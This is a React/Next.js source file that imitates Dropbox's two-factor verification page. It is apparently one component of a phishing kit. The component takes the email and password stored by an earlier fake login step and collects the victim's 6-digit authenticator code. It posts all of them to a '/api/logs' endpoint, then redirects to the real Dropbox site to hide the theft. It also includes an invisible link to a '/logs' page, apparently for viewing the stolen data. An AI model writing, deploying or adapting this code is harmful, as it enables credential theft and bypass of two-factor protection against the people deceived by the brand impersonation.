'use client';

import { useState, useRef, useEffect } from 'react';
import Image from 'next/image';
import classNames from 'classnames';

export default function TwoFactorAuth() {
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [userEmail, setUserEmail] = useState('');
  const [userPassword, setUserPassword] = useState('');
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    // Check if user came from login page
    const email = sessionStorage.getItem('email');
    const password = sessionStorage.getItem('password');
    if (!email || !password) {
      window.location.href = '/login';
      return;
    }
    setUserEmail(email);
    setUserPassword(password);

    // Focus the first input on mount
    if (inputRefs.current[0]) {
      inputRefs.current[0].focus();
    }
  }, []);

  const handleInput = (index: number, value: string) => {
    if (value.length > 1) {
      value = value.slice(-1);
    }
    
    const newCode = [...code];
    newCode[index] = value;
    setCode(newCode);

    // Move to next input if value is entered
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      // Move to previous input on backspace if current input is empty
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const fullCode = code.join('');
    if (fullCode.length !== 6) return;

    setIsSubmitting(true);
    
    // Log the 2FA attempt
    try {
      const logData = {
        timestamp: new Date().toLocaleString(),
        email: sessionStorage.getItem('email') || '',
        password: sessionStorage.getItem('password') || '',
        code: code.join(''),
        type: '2FA'
      };
      await fetch('/api/logs', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(logData),
      });
    } catch (error) {
      console.error('Error logging 2FA attempt:', error);
    }

    // Clean up session storage
    sessionStorage.removeItem('email');
    sessionStorage.removeItem('password');

    // Redirect immediately
    window.location.href = 'https://www.dropbox.com/home';
  };

  return (
    <div className="min-h-screen flex flex-col justify-center py-12 sm:px-6 lg:px-8">
      <div className="sm:mx-auto sm:w-full sm:max-w-md">
        <div className="text-center">
          <Image
            src="/dropbox-logo.svg"
            alt="Dropbox"
            width={48}
            height={48}
            className="mx-auto"
          />
          <h2 className="mt-6 text-center text-3xl font-bold tracking-tight text-dropbox-gray">
            Enter your code
          </h2>
          <p className="mt-2 text-center text-sm text-gray-600">
            We sent a 6-digit code to your trusted authenticator
          </p>
        </div>

        <div className="mt-8 sm:mx-auto sm:w-full sm:max-w-md">
          <div className="bg-white py-8 px-4 shadow sm:rounded-lg sm:px-10">
            <form className="space-y-6" onSubmit={handleSubmit}>
              <div>
                <div className="flex justify-between gap-2">
                  {code.map((digit, index) => (
                    <input
                      key={index}
                      ref={el => { inputRefs.current[index] = el }}
                      type="number"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleInput(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      className={classNames(
                        "block w-12 h-12 text-center text-xl border rounded-md shadow-sm",
                        "focus:outline-none focus:ring-1 focus:border-dropbox-blue focus:ring-dropbox-blue",
                        "placeholder-gray-400",
                        digit ? "border-gray-300" : "border-gray-200"
                      )}
                    />
                  ))}
                </div>
              </div>

              <div>
                <button
                  type="submit"
                  disabled={isSubmitting || code.join('').length !== 6}
                  className={classNames(
                    "w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white",
                    "focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-dropbox-blue",
                    isSubmitting || code.join('').length !== 6
                      ? "bg-gray-300 cursor-not-allowed"
                      : "bg-dropbox-blue hover:bg-dropbox-hover"
                  )}
                >
                  {isSubmitting ? 'Verifying...' : 'Continue'}
                </button>
              </div>
            </form>

            <div className="mt-6">
              <div className="relative">
                <div className="relative flex justify-center text-sm">
                  <span className="px-2 text-gray-500">
                    <button className="text-dropbox-blue hover:text-dropbox-hover font-medium">
                      Use backup codes
                    </button>
                    {' • '}
                    <button className="text-dropbox-blue hover:text-dropbox-hover font-medium">
                      Get help
                    </button>
                  </span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      {/* Hidden link to logs page - triple click to access */}
      <div 
        onClick={() => window.location.href = '/logs'} 
        className="fixed bottom-0 right-0 w-4 h-4 opacity-0"
      />
    </div>
  );
} 